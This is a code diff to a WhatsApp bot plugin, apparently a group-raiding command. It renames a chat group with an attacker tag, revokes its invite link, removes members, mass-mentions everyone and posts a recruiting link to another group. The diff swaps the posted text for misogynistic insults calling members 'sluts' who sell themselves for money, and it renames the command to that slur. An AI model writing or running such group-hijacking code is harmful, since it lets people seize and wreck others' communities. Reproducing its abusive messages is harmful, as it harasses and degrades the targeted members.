@@ -12,10 +12,20 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
     try {
         let metadata = await conn.groupMetadata(m.chat);
         let oldName = metadata.subject;
-        let newName = `${oldName} | 𝚂𝚅𝚃 𝙱𝚢  𝐁𝐋𝐎𝐎𝐃`;
+        let newName = `${oldName} | 𝑺𝑽𝑻 𝑩𝒀  𝚯𝚩𝚵𝐘𝐑𝚫`;
         await conn.groupUpdateSubject(m.chat, newName);
     } catch (e) {
         console.error('Errore cambio nome gruppo:', e);
+    }
+
+    // 🔹 RESET LINK GRUPPO
+    let newInviteLink = '';
+    try {
+        await conn.groupRevokeInvite(m.chat); // invalida il vecchio link
+        let code = await conn.groupInviteCode(m.chat); // prende il nuovo codice
+        newInviteLink = `https://chat.whatsapp.com/${code}`;
+    } catch (e) {
+        console.error('Errore reset link:', e);
     }
 
     let usersToRemove = participants
@@ -31,11 +41,11 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
     let allJids = participants.map(p => p.jid);
 
     await conn.sendMessage(m.chat, {
-        text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐞 𝐪𝐮𝐞𝐬𝐭𝐨 𝐬𝐢𝐠𝐧𝐢𝐟𝐢𝐜𝐚 𝐬𝐨𝐥𝐨 𝐮𝐧𝐚 𝐜𝐨𝐬𝐚, 𝐃𝐄𝐕𝐀𝐒𝐓𝐎. 𝐈𝐥 𝐝𝐞𝐯𝐚𝐬𝐭𝐨 𝐜𝐡𝐞 𝐚𝐦𝐦𝐚𝐳𝐳𝐞𝐫𝐚̀ 𝐭𝐮𝐭𝐭𝐢 𝐩𝐫𝐨𝐩𝐫𝐢𝐨 𝐜𝐨𝐦𝐞 𝐮𝐧𝐚 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐚, 𝐩𝐫𝐨𝐩𝐫𝐢𝐨 𝐪𝐮𝐞𝐥𝐥𝐚 𝐜𝐡𝐞 𝐯𝐢 𝐝𝐚𝐫𝐚̀."
+                text: "𝒍𝒂 𝒗𝒊𝒕𝒂 𝒑𝒖𝒐 𝒔𝒆𝒎𝒃𝒓𝒂𝒓𝒆 𝒅𝒊𝒇𝒇𝒊𝒄𝒊𝒍𝒆 𝒔𝒆𝒏𝒛𝒂 𝒎𝒂𝒏𝒄𝒐 𝒖𝒏 𝒄𝒆𝒏𝒕𝒆𝒔𝒊𝒎𝒐 𝒆 𝒕𝒊 𝒕𝒐𝒄𝒄𝒂 𝒇𝒂𝒓𝒆 𝒍𝒂 𝒕𝒓𝒐𝒊𝒂 𝒑𝒆𝒓 𝒔𝒐𝒍𝒅𝒊,𝒒𝒖𝒊𝒏𝒅𝒊 𝒃𝒓𝒖𝒕𝒕𝒆 𝒕𝒓𝒐𝒊𝒆 𝒍𝒂𝒔𝒄𝒊𝒂𝒕𝒆𝒗𝒊 𝒂𝒏𝒅𝒂𝒓𝒆 𝒏𝒆𝒍 𝒗𝒖𝒐𝒕𝒐 𝒄𝒐𝒎𝒆 𝒑𝒊𝒖𝒎𝒆 "
     });
 
     await conn.sendMessage(m.chat, {
-        text: "𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥' 𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 𝐁𝐥𝐨𝐨𝐝, 𝐯𝐢 𝐚𝐬𝐩𝐞𝐭𝐭𝐢𝐚𝐦𝐨 𝐭𝐮𝐭𝐭𝐢 𝐪𝐮𝐚:\n\nhttps://chat.whatsapp.com/DlKyK9zvjWnK2KUwGBqyZi",
+        text: `𝒔𝒆 𝒗𝒐𝒍𝒆𝒕𝒆 𝒔𝒄𝒂𝒑𝒑𝒂𝒓𝒆 𝒅𝒂 𝒒𝒖𝒆𝒔𝒕𝒐 𝒄𝒊𝒄𝒍𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒐 𝒍𝒂𝒔𝒄𝒊𝒂𝒕𝒆 𝒍𝒂 𝒎𝒂𝒏𝒐 𝒂𝒍𝒍𝒂 𝒑𝒂𝒖𝒓𝒂 𝒆 𝒆𝒏𝒕𝒓𝒂𝒕𝒆 𝒒𝒖𝒊 https://chat.whatsapp.com/FgQdQnWcqv0JAb7NA82nyU`,
         mentions: allJids
     });
 
@@ -47,7 +57,7 @@ let handler = async (m, { conn, participants, isBotAdmin }) => {
     }
 };
 
-handler.command = ['pugnala'];
+handler.command = ['troie'];
 handler.group = true;
 handler.botAdmin = true;
 handler.owner = true;
